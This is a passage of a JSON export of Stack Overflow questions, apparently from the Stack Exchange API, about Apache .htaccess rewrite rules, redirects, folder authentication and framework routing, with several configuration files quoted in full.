</p>\n"},{"tags":["php",".htaccess","curl","folder","protected"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":143,"score":1,"question_id":12265474,"title":"Files in htaccess protected folder read by PHP script in the same folder","body":"<p>I have a folder protected by .htaccess (digest authentication). I need to read outputs of some scripts located in subfolders of this folder using file_get_contents. This reading script is located in the protected folder root. It can't perform the file_get_contents function because of the folder protection.\nIs there any way to allow certain PHP scripts to operate in the folder by some htaccess settings so I won't have to create some cURL based login sessions in the scripts?</p>\n"},{"tags":[".htaccess","drupal"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12241101,"title":"Sitename/node?destination=node giving not found error after migration","body":"<p>We recently migrated a Drupal 7 instance from one web host to another. We transferred all of the files as well as the database. The site is mostly working, however whenever we attempt to login, we get a 404 Not Found error.</p>\n\n<p>What could be causing this? Is this an .htaccess error? We still haven't pointed the domain name to the new server (we're accessing it via IP) - could that have anything to do with it?</p>\n\n<p>.htaccess file, in full:</p>\n\n<pre><code>#\n# Apache/PHP/Drupal settings:\n#\n\n# Protect files and directories from prying eyes.\n&lt;FilesMatch \"\\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\\.php)?|xtmpl)$|^(\\..*|Entries.*|Repository|Root|Tag|Template)$\"&gt;\n  Order allow,deny\n&lt;/FilesMatch&gt;\n\n# Don't show directory listings for URLs which map to a directory.\nOptions -Indexes\n\n# Follow symbolic links in this directory.\n# For security reasons, Option followsymlinks cannot be overridden.\n#Options +FollowSymLinks\n#Options +SymLinksIfOwnerMatch\n\n# Make Drupal handle any 404 errors.\nErrorDocument 404 /index.php\n\n# Set the default handler.\nDirectoryIndex index.php index.html index.htm\n\n# Override PHP settings that cannot be changed at runtime. See\n# sites/default/default.settings.php and drupal_environment_initialize() in\n# includes/bootstrap.inc for settings that can be changed at runtime.\n\n# PHP 5, Apache 1 and 2.\n&lt;IfModule mod_php5.c&gt;\n  php_flag magic_quotes_gpc                 off\n  php_flag magic_quotes_sybase              off\n  php_flag register_globals                 off\n  php_flag session.auto_start               off\n  php_value mbstring.http_input             pass\n  php_value mbstring.http_output            pass\n  php_flag mbstring.encoding_translation    off\n&lt;/IfModule&gt;\n\n# Requires mod_expires to be enabled.\n&lt;IfModule mod_expires.c&gt;\n  # Enable expirations.\n  ExpiresActive On\n\n  # Cache all files for 2 weeks after access (A).\n  ExpiresDefault A1209600\n\n  &lt;FilesMatch \\.php$&gt;\n    # Do not allow PHP scripts to be cached unless they explicitly send cache\n    # headers themselves. Otherwise all scripts would have to overwrite the\n    # headers set by mod_expires if they want another caching behavior. This may\n    # fail if an error occurs early in the bootstrap process, and it may cause\n    # problems if a non-Drupal PHP file is installed in a subdirectory.\n    ExpiresActive Off\n  &lt;/FilesMatch&gt;\n&lt;/IfModule&gt;\n\n# Various rewrite rules.\n&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine on\n\n  # Block access to \"hidden\" directories whose names begin with a period. This\n  # includes directories used by version control systems such as Subversion or\n  # Git to store control files. Files whose names begin with a period, as well\n  # as the control files used by CVS, are protected by the FilesMatch directive\n  # above.\n  #\n  # NOTE: This only works when mod_rewrite is loaded. Without mod_rewrite, it is\n  # not possible to block access to entire directories from .htaccess, because\n  # &lt;DirectoryMatch&gt; is not allowed here.\n  #\n  # If you do not have mod_rewrite installed, you should remove these\n  # directories from your webroot or otherwise protect them from being\n  # downloaded.\n  RewriteRule \"(^|/)\\.\" - [F]\n\n  # If your site can be accessed both with and without the 'www.' prefix, you\n  # can use one of the following settings to redirect users to your preferred\n  # URL, either WITH or WITHOUT the 'www.' prefix. Choose ONLY one option:\n  #\n  # To redirect all users to access the site WITH the 'www.' prefix,\n  # (http://example.com/... will be redirected to http://www.example.com/...)\n  # uncomment the following:\n  # RewriteCond %{HTTP_HOST} !^www\\. [NC]\n  # RewriteRule ^ http://www.%{HTTP_HOST}%{REQUEST_URI} [L,R=301]\n  #\n  # To redirect all users to access the site WITHOUT the 'www.' prefix,\n  # (http://www.example.com/... will be redirected to http://example.com/...)\n  # uncomment the following:\n  # RewriteCond %{HTTP_HOST} ^www\\.(.+)$ [NC]\n  # RewriteRule ^ http://%1%{REQUEST_URI} [L,R=301]\n\n  # Modify the RewriteBase if you are using Drupal in a subdirectory or in a\n  # VirtualDocumentRoot and the rewrite rules are not working properly.\n  # For example if your site is at http://example.com/drupal uncomment and\n  # modify the following line:\n  # RewriteBase /drupal\n  #\n  # If your site is running in a VirtualDocumentRoot at http://example.com/,\n  # uncomment the following line:\n  # RewriteBase /\n\n  # Pass all requests not referring directly to files in the filesystem to\n  # index.php. Clean URLs are handled in drupal_environment_initialize().\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_URI} !=/favicon.ico\n  RewriteRule ^ index.php [L]\n\n  # Rules to correctly serve gzip compressed CSS and JS files.\n  # Requires both mod_rewrite and mod_headers to be enabled.\n  &lt;IfModule mod_headers.c&gt;\n    # Serve gzip compressed CSS files if they exist and the client accepts gzip.\n    RewriteCond %{HTTP:Accept-encoding} gzip\n    RewriteCond %{REQUEST_FILENAME}\\.gz -s\n    RewriteRule ^(.*)\\.css $1\\.css\\.gz [QSA]\n\n    # Serve gzip compressed JS files if they exist and the client accepts gzip.\n    RewriteCond %{HTTP:Accept-encoding} gzip\n    RewriteCond %{REQUEST_FILENAME}\\.gz -s\n    RewriteRule ^(.*)\\.js $1\\.js\\.gz [QSA]\n\n    # Serve correct content types, and prevent mod_deflate double gzip.\n    RewriteRule \\.css\\.gz$ - [T=text/css,E=no-gzip:1]\n    RewriteRule \\.js\\.gz$ - [T=text/javascript,E=no-gzip:1]\n\n    &lt;FilesMatch \"(\\.js\\.gz|\\.css\\.gz)$\"&gt;\n      # Serve correct encoding type.\n      Header set Content-Encoding gzip\n      # Force proxies to cache gzipped &amp; non-gzipped css/js files separately.\n      Header append Vary Accept-Encoding\n    &lt;/FilesMatch&gt;\n  &lt;/IfModule&gt;\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","download","bots"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12267184,"title":"How to prevent large number of downloads of a certain file with .htaccess","body":"<p>I need to know how to prevent repetitive file downloads using .htaccess, or if not via .htaccess than some other method.</p>\n\n<p>A site I maintain had over 9,000 hits on a single PDF file, accounting for over 80% of the site's total bandwidth usage, and I believe that most of the hits were from the same IP address. I've banned the IP, but that's obviously not an effective solution because there are always proxies and besides, I can only do that after the fact.</p>\n\n<p>So what I want to do is cap the number of times a single IP can attempt to download a designated file or file type over a given period of time. Can this be done with .htaccess? If not, what other options do I have?</p>\n\n<p>EDIT: The suggestion that I redirect requests to a server-side script that would track requests by IP via database sounds like a good option. Can anyone recommend an existing script or library?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12265736,"title":".htaccess redirect based on screen size","body":"<p>This question is in responce to my previous <a href=\"http://stackoverflow.com/questions/11893734/screen-width-issue-when-using-different-browsers-on-hand-held-smart-devices/12021165#12021165\">Question</a> regarding redirection as per screen size. I would like to know is it possible through .htaccess to redirect based on screen size if its possible kindly let me know how can I do that.</p>\n\n<p>Thanks,</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12262431,"title":"force a url pattern","body":"<p>I am about creating a new website; content is classified as article; tag and category\nI have folder1 and folder2 which are folders on the remote web server; each of these two folders may contain HTML files</p>\n\n<p>I want that everyone who is browsing my website\n    1-When he types \n        www.domin.com/folder1/ -->dispaly the index.html file under the folder1 folder\n    2-When he types \n        www.domin.com/folder1 --> error\n    3-When he types \n        www.domain.com/folder1/file1/ --> dispaly the /folder1/file1.html file\n    4-When he types\n        www.domain.com/folder/file.html or\n        www.domain.com/folder/file  --> dispaly an eror : such file does not exist</p>\n\n<p>Actually , what I done is the points: 1, 3\nThe following .htacces file content (under the public_html folder on the remote web server)</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.html -f\nRewriteRule ^([^/]+)/$ $1.html\n\nRewriteCond %{THE_REQUEST} ^[A-Z]+\\ /([^/]+/)*[^.]+\\.php(\\?[^\\ ]*)?\\ HTTP/\nRewriteRule ^(([^/]+/)*[^.]+)\\.php$ http://www.domain.com/$1 [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/)$\nRewriteRule (.*)$ http://www.domain.com/$1/ [R=301,L]\n\n\n\n#DirectorySlash On\n#RewriteEngine On\n#RewriteCond %{REQUEST_FILENAME} !-f\n#RewriteRule ^([^\\.]+)$ $1.html [NC,L] \n#RewriteRule ^([^\\.]+)$ $1.htm [NC,L] \n#RewriteRule ^([^\\.]+)$ $1.php [NC,L] \n</code></pre>\n\n<p>I need help to modify my .htaccess file so to be conform with the points 2, and 4\nthanks a lot </p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12264952,"title":"Exclude request with get parameter from .htaccess rule","body":"<p>I have this htaccess rule:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !assets\nRewriteRule \\.(?:jpe?g|gif|png)$ script.php\n</code></pre>\n\n<p>It redirects all image requests to <code>script.php</code>. I'd like to exclude all requests that contain GET parameter, for example <code>http://myweb.com/image.jpg?process=0</code> but have <code>http://myweb.com/image.jpg</code> included.</p>\n\n<p>How should I edit my rule? Thanks</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":166,"score":0,"question_id":6184451,"title":"Apache : Restrict access to URI, not resource","body":"<p>I'd like to restrict access to some URIs, but they do not physically match a clearly identified resource.\nI explain : if you ask <a href=\"http://domainname/admin\" rel=\"nofollow\">http://domainname/admin</a>, you do not strictly go to the admin dir, you go to a script, with some params; and this script can also be used in other contexts.</p>\n\n<p>So, i'd like to make something like folder access restriction, but based on the URI asked for, not on the actuel resource (cause the /admin folder exists, of course :D).</p>\n\n<p>How could i do that ?</p>\n\n<p>TIA</p>\n"}]}
{"total":14528,"page":20,"pagesize":100,"questions":[{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12263475,"title":"How to redirect complete domain to a particular folder","body":"<p>i want to rewrite url using .htaccess file, \nmy all data is saved in work folder on server \nand i want to show that folder when user enter the complete webaddress</p>\n\n<p><code>www.example.com</code> to <code>www.example.com/work</code> using mod_rewrite</p>\n\n<p>my code is</p>\n\n<pre><code>RewriteRule ^(.*)$ /work/$1 [L,QSA]\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^\\.]+)$ $1.php [NC,L]\n</code></pre>\n\n<p>this code create problem when i enter somthing like <code>www.example.com/folder/</code> than it externally redirect me to <code>www.example.com/work/folder/</code> and shows 404 page not found even when work contains that folder and that folder contain index.php</p>\n"},{"tags":["php","apache",".htaccess","http-status-code-500"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":152,"score":3,"question_id":12232907,"title":".htaccess gives 500 error on localhost","body":"<p>i'm beginner to MVC framework. I'm trying to create one my own based on tutorials. </p>\n\n<p>.htaccess file that they provide contains:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteRule ^(.+)$ index.php?url=$1 [QSA, L]\n</code></pre>\n\n<p>i get 500 server error:  The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there was an error in a CGI script. </p>\n\n<p>I checked httpd.conf to check if mode_rewrite was not commented. Can anyone help me please? i'm using LAMPP on Ubuntu 12.04 </p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12260779,"title":"rewriterule -> http://www.domain.com to a page","body":"<p>How do I write a rule that'll take a user to /data/test.php when he accesses the site using <a href=\"http://www.domain.com\" rel=\"nofollow\">http://www.domain.com</a> (and nothing else after that (maybe a slash)). There are no other pages in my root folder, not even index.html. All other rules require something after the domain, but if I type only the domain I get the directory list. Any idea how its done. I did the one below, but it redirects everything (any request path) to the specified file.</p>\n\n<pre><code>RewriteRule ^/? /data/test.php\n</code></pre>\n"},{"tags":["php","windows",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12260429,"title":"How can we use .htaccess for windows server using php?","body":"<p>I want to implement .htaccess for URL rewrite. I am using windows server.</p>\n\n<p>I know there are two solutions:</p>\n\n<ol>\n<li><p>using webconfig</p></li>\n<li><p>using Helicon</p></li>\n</ol>\n\n<p>I dont know how to write .htaccess code in webconfig file and I dont want to use Helicon because this is paid.</p>\n\n<p>The code I want to implement in the webconfig file is :</p>\n\n<pre><code>    AddType application/x-httpd-php .html\n    RewriteEngine on\n\n    &lt;IfModule mod_rewrite.c&gt;\n\n    RewriteCond %{Request_Filename} !-d\n    RewriteCond %{Request_Filenam}e !-f\n\n    RewriteRule ^privacy  privacy.html [NC]\n    RewriteRule ^dating-articles dating-articles.html [NC]\n    RewriteRule ^articles/([0-9A-Za-z_\\-~',]+)    article_detail.html?article_link=$1 [NC]\n    RewriteRule ^([a-zA-Z0-9_-]+)$ page.php?page_slug=$1  [NC]\n\n    &lt;/IfModule&gt;\n</code></pre>\n\n<p>Thanks in advance.</p>\n"},{"tags":[".htaccess","cakephp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12259231,"title":"No CSS with cakePHP installed in subfolder of server","body":"<p>I'm facing a problem with a cakephp application.</p>\n\n<p>On my server, I have a folder called DIGIPRESSKIT (this folder is used by the domain www.digipresskit-online.com), I placed all the cake's folders into it and when I load the page, there is no CSS, like cake can't access my webroot.\nIs there any chance u check my .htaccess ?\nI read lots of forums about that, and here is what they tell me to do : </p>\n\n<p>Code: \"root/.htaccess\" (/DIGIPRESSKIT)  </p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^$ /app/webroot/ [L]\nRewriteRule (.*) /app/webroot/$1 [L]\n</code></pre>\n\n<p>Code: \"root/app/.htaccess\" (/DIGIPRESSKIT/app)</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^$ /webroot/ [L]\nRewriteRule (.*) /webroot/$1 [L]\n</code></pre>\n\n<p>Code: \"root/app/webroot/.htaccess\"</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ /index.php?url=$1 [QSA,L]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12258389,"title":"mod_rewrite redirects instead of rewriting URLs","body":"<p>Good day everyone,</p>\n\n<p>I have an HTACCESS file that contains the following:</p>\n\n<pre><code>Options +FollowSymlinks\n\nRewriteEngine on\n\nRewriteRule ^(.*)$ http://mydomain.com/public/$1\n\n\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\n</code></pre>\n\n<p>The purpose of the code is that when the user types my domain name 'mydomain.com', it will not call the mydomain.com/index.php, instead it will call the mydomain.com/public/index.php without the user noticing the redirect (or internal redirects).</p>\n\n<p>I got the code on some website and it works on my local machine (WAMP stack).\nThe problem is, when I transfer it now to a shared hosting server, then an external redirect occurs instead of an internal one. Example:</p>\n\n<p>Typing mydomain.com would then be mydomain.com/public in the address bar.</p>\n\n<p>I already checked the hosting server's configuration and yes, </p>\n\n<ul>\n<li>HTACCESS are enabled.</li>\n<li>mod_rewrite is enabled.</li>\n<li>I can modify PHP settings using an HTACCESS file.</li>\n</ul>\n\n<p>The shared hosting server implements the LAMP stack.</p>\n\n<p>Any idea on what I'm missing? Thank you very much!</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>All my rewrites are redirecting not only that code which are perfectly working on my local computer.</p>\n"},{"tags":["php","regex",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12257932,"title":"Apache mod_rewrite and regular expression","body":"<p>In my HTML I want to refer to my images like this:</p>\n\n<pre><code>/images/articles/this-is-the-page-title-dgj4klci5j4.jpg\n/images/articles/thumbs/this-is-the-page-title-dgj4klci5j4.jpg\n/images/gallery/this-is-the-page-title-qj3k56l6kfm.jpg\n</code></pre>\n\n<p>but they are really located at:</p>\n\n<pre><code>/_pics/articles/dgj4klci5j4.jpg\n/_pics/articles/thumbs/dgj4klci5j4.jpg\n/_pics/gallery/qj3k56l6kfm.jpg\n</code></pre>\n\n<p>My .htaccess file is currently in the root directory of the site and looks something like this:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{HTTP_HOST} ^website\\.com [NC]\nRewriteRule ^(.*)$ http://www.website.com/$1 [R=permanent,L]\n\nRewriteRule ^articles/ user/articles.php [L]\nRewriteRule ^gallery/ info/gallery.php [L]\n</code></pre>\n\n<p>I have to do this because in the last possible moment the client decided that he wants more legible image filenames and this seems like a quick reasonable fix.</p>\n\n<p>I imagine that I could redirect everything from /images to /_pics and take the page title out by just using mod_rewrite. Problem is that I'm not very good with regular expressions and I don't fully understand the way mod_rewrite works. Can I get some help? Thanks</p>\n\n<p>The real image filename only contains letters and numbers and can be jpg or png.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","host"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12247721,"title":"Generic .htaccess for multiple websites stored in subdirectories","body":"<p>My development environment is set up for using a single host (<code>localhost</code>). I am developing multiple websites on my machine, each stored under its own directory like this:</p>\n\n<pre><code>     /var/www/site1\n     /var/www/site2\n     ...\n</code></pre>\n\n<p>The document root is set to <code>/var/www</code> on my machine.</p>\n\n<p>I am using URL rewriting for most of these websites and most of the <code>.htaccess</code> files will rewrite a sub-directory to <strong>GET</strong> parameters in different ways like this:</p>\n\n<pre><code>http://localhost/site1/home/red -&gt; http://localhost/site1/index.php?page=home&amp;p1=red\nhttp://localhost/site2/index/param1/param2/param3 -&gt; http://localhost/site2/index.php?page=index&amp;p1=param1&amp;p2=param2&amp;p3=param3\n</code></pre>\n\n<p>I also tend to copy some of these websites under different directories and, when I do that, I have to make a lot of changes in the <code>.htaccess</code> files for the website that I'm copying.</p>\n\n<p>I would like to know if there is a way to define a constant that contains the website's root directory (not the host's document root) and how can that be used with the rewrite rule so that I would need to change only one line of code (setting this constant to a different value) when copying a website.</p>\n\n<p>Putting this in a different form, is there a way to perform rewrites that relate to a website root instead of a host / <code>%{HTTP_HOST}</code> (i.e. the \"host\" for the website being <code>localhost/site1</code> instead of <code>localhost</code>) and how can this be done?</p>\n\n<p>I have tried removing the host from each request at the beginning of the script and prepending it back at the end of the script, but this does not work with rewrite rules that use the <code>[L]</code> option.</p>\n\n<p>Thank you!</p>\n\n<p>Regards,\nLucian</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":111,"score":1,"question_id":12225588,"title":"HTACCESS not redirecting correctly even though all the debugging says it should","body":"<p>I'm using rewrites to neaten my urls and for ease of coding because as you'll see, I was forced to create a deeply nested folder structure. I use this rule set</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /base/\nRewriteRule sys/admin root/system/exchange/graphical/index.php [L]\nRewriteRule sys/graphical/(.+)$ root/system/exchange/graphical/$1 [QSA,L]\nRewriteRule sys/action/(.+)$ root/system/exchange/action/$1 [QSA,L]\nRewriteRule sys/images/(.+)$ root/system/exchange/graphical/data/img/$1 [QSA,L]\n</code></pre>\n\n<p>so when I type <em>foo.com/base/sys/admin</em> apache correctly rewrites to <em>foo.com/base/root/system/exchange/graphical/index.php</em>.\nFrom there I include several things</p>\n\n<pre><code>&lt;link href=\"graphical/data/compiler.php?type=css\" type=\"text/css\" rel=\"stylesheet\"/&gt;\n&lt;link rel=\"shortcut icon\" href=\"images/favicon.ico\"&gt;\n&lt;script src=\"graphical/data/compiled/libraries.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"graphical/data/compiler.php?type=js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>ALL of these work correctly EXCEPT the link for the favicon and I cannot figure out why.</p>\n\n<p>EXAMPLE:<br>\n<em>graphical/data/compiler.php?type=js</em> <br>is correctly rewritten to<br><em>/root/sys/graphical/data/compiler.php?type=js</em></p>\n\n<p>In search of a solution I used <a href=\"http://gskinner.com/RegExr/\" rel=\"nofollow\">RegExr</a> and <a href=\"http://htaccess.madewithlove.be/\" rel=\"nofollow\">htaccess Tester</a>. Both sites told me what my logic provided as well: THIS SHOULD WORK!</p>\n\n<p>So I manually went to <em>foo.com/base/sys/images/favicon.ico</em>, which should have been rewritten to <em>foo.com/base/root/system/exchange/graphical/data/img/favicon.ico</em> for all I know. But it didn't.</p>\n\n<p>Any ideas?</p>\n\n<p>I used different browsers to access the website to exclude a vendor-specific problem. Newest Version each, of course. (Chrome, Firefox, IE9, Opera)</p>\n\n<p>Here's something stranger yet! I accessed a subfolder of /img/ called jui like so:\n<em>foo.com/base/sys/images/jui/image.png</em>\nAND IT WORKED! I cannot access images in /img/ however, OR the folder itself.</p>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12251262,"title":"htaccess: allow access only if rules are fulfilled","body":"<p>I've done this htaccess file with a few rewrite rules, but problem is, i'm able to access individual .php files on the server as well a directly access sections like domain.com/admin/change_profile.php</p>\n\n<p>Is this normal? I thought this was not supposed to happen. How do I do this htaccess file so that only if a rule is fulfilled it'll take me to that folder? In short: disallow direct access to domain.com/admin/change_profile.php or domain.com/admin/ or anything else.</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^/?(us|uk|eu)/?$ test.php [NC,L] #Country\nRewriteRule ^/?(us|uk|eu)/(profile)/([a-zA-z0-9]+)/?$ test.php [NC,L] #Country - Profile\n</code></pre>\n\n<p>Here:</p>\n\n<pre><code>http://localhost/us -&gt; Works\nhttp://localhost/us/profile/companyname -&gt; Works\nhttp://localhost/admin -&gt; Works too! But admin is not in the set of rules above. admin is a folder inside htdocs.\n</code></pre>\n\n<p> should not have worked since its not part of (us|uk|eu) rule. Note: Its a folder with php files inside htdocs. How is this happening and how to overcome it.</p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12178371,"title":"Rewrite rule on multiple variables changing script src Path","body":"<p>i am using a Rewrite rule for my site but its changing changing script src Path</p>\n\n<p>here is the rule i am using</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule .* - [L]\nRewriteRule ^(.*)$ /user_page.php?id=$1 [NC]\n\n# Changing Search URL\nRewriteRule ^/([^/]*)/([^/]*)/([^/]*)$ search_out.php?comp_city=$1&amp;one=$2comp_landmark=$3 [L]\n</code></pre>\n\n<p># Changing Search URL is the one which is causing prob ... \n page it will show u the script src or all link rel=\"stylesheet\" type=\"text/css\" are pointed to <a href=\"http://www.xxxxx.com/Rajpura/Schools/js/jquery-1.6.2.min.js\" rel=\"nofollow\">http://www.xxxxx.com/Rajpura/Schools/js/jquery-1.6.2.min.js</a> rather than <a href=\"http://www.xxxxx.com/js/jquery-1.6.2.min.js\" rel=\"nofollow\">http://www.xxxxx.com/js/jquery-1.6.2.min.js</a></p>\n\n<p>Please help</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12255018,"title":"Rewriting Wordpress Dynamic URLS. Through .Htaccess","body":"<p>I have url pattern like this.</p>\n\n<p>site.com/page-name?variable-name=variable value</p>\n\n<p>I want this to be  site.com/variable - value</p>\n\n<p>I' am not good in rewrite api. Please guide me through .htaccess.</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12251319,"title":".htaccess control file rewritting rules","body":"<p>I have the following rewriterule:</p>\n\n<pre><code>   RewriteRule ^api/(.*)?   api/api.php [QSA,L]  \n</code></pre>\n\n<p>so if the url is <a href=\"http://www.test.com/api/\" rel=\"nofollow\">http://www.test.com/api/</a>... , it will be rerouted to the file api.php inside api folder. This works.</p>\n\n<p>However, I'd like to add another rule such that if url is <a href=\"http://www.test.com/second_api/\" rel=\"nofollow\">http://www.test.com/second_api/</a>...  will  reroute to file second_api.php inside the api folder. I don't get that to work. </p>\n\n<pre><code>      RewriteRule ^second_api/(.*)?   api/second_api.php [QSA,L]  \n      RewriteRule (.*)/second_api/(.*)?   api/second_api.php [QSA,L] \n      RewriteRule ^/second_api/(.*)?   api/second_api.php [QSA,L]   \n</code></pre>\n\n<p>Either it's the wrong url or it keep reroute to api.php. I'd like to reroute to second_api.php with the new added rule.</p>\n"},{"tags":["php",".htaccess","zend-framework","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12254870,"title":"Is it possible to combine these two .htaccess files?","body":"<p>I have to completely replace an existing website.  The current site is completely spagetti code with some rewrite rules to mimic friendly urls.</p>\n\n<p>There are some mission critical issues that can't be resolved with the current architecture and database structure, so for a time both code bases need to live side by side.</p>\n\n<p>This is the current .htaccess</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On \n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.html -f\nRewriteRule ^([^/]+)/$ $1.html\nRewriteRule ^([^/]+)/$ $1.php\n\nRewriteRule ^([^/]+)/([^/]+)/$ $1.php?q=$2\nRewriteRule ^([^/]+)/([^/]+)/([^/]+)/$ $1.php?q=$2&amp;r=$3\nRewriteRule ^([^/]+)/([^/]+)/([^/]+)/([^/]+)/$ $1.php?q=$2&amp;r=$3&amp;s=$4\n</code></pre>\n\n<p>I'm replacing it with a zend framework site, but it routes everything through the index.php file for the routing</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} -f [NC,OR]\nRewriteCond %{REQUEST_FILENAME} -d [NC]\nRewriteRule .* - [L]\nRewriteRule .* index.php\n</code></pre>\n\n<p>Does anyone have any idea how I can combine the two until the original can be completely replaced?</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12251585,"title":"htaccess RewriteCond, will it affect all the rules below it?","body":"<p>I have an htaccess that looks something like this:</p>\n\n<pre><code>RewriteCond %{HTTP_USER_AGENT} !^irefox+\nRewriteRule ^(.*)/index.html?(.*)$ /handler.php?a=%{QUERY_STRING}&amp;b=$2\n\nRewriteCond %{HTTP_USER_AGENT} ^irefox+\nRewriteRule ^(.*)/index.html?(.*)$ /handler.php?a=%{QUERY_STRING}&amp;b=$2&amp;c=firefox\n\nRewriteRule ^tag/(.*)/$ /index.php?tag=$1\nRewriteRule ^action/(.*)$ /index.php?action=$1 [L]\n</code></pre>\n\n<p>Will the RewriteCond affect only the first rule below it, or will it affect the last 2 also?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12253615,"title":"htaccess redirect with 301 from a folder that no longer exists","body":"<p>I've read a number of websites and they all say something different. On my friends site his blog was previously www.bellastairs.com/news now its just the main page so www.bellastairs.com.</p>\n\n<p>What is the easiest way to redirect any hits that no longer exist trying to get to news to redirect to the homepage?</p>\n\n<p>For example <a href=\"http://www.google.com/search?client=safari&amp;rls=en&amp;q=glass%20stairs%20miami&amp;ie=UTF-8&amp;oe=UTF-8\" rel=\"nofollow\">google</a> searching for glass stairs miami.</p>\n\n<p>He's the second link but its now dead. Is there an easy way to change the htaccess to redirect that permanently to his homepage?</p>\n"},{"tags":["php",".htaccess","htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12254612,"title":".htaccess and .htpasswd ignore subfolders","body":"<p>I want to ignore folders on my website, but as I often create subfolders on it, I want to ignore subfolders too.</p>\n\n<p>Here's my .htaccess :</p>\n\n<pre><code>AuthType Basic\nAuthName \"Auth Required\"\nAuthUserFile \".htpasswd location\"\nRequire valid-user\nSetEnvIf Request_URI \"(folder I want to ignore for everyone)$\" allow\nOrder allow,deny\nAllow from env=allow\n# 